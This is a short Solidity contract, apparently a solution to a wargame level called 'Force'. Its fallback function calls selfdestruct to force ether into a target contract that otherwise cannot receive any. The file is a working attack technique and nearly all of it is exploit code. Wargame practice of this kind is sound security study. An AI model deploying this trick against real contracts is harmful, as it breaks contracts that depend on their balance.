// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force {}

contract ForceAttack {

    Force forceContract;

    constructor(address forceAddress) {
        forceContract = Force(forceAddress);
    }

    fallback() payable external {
        address payable addr = payable(address(forceContract));
        selfdestruct(addr);
    }
}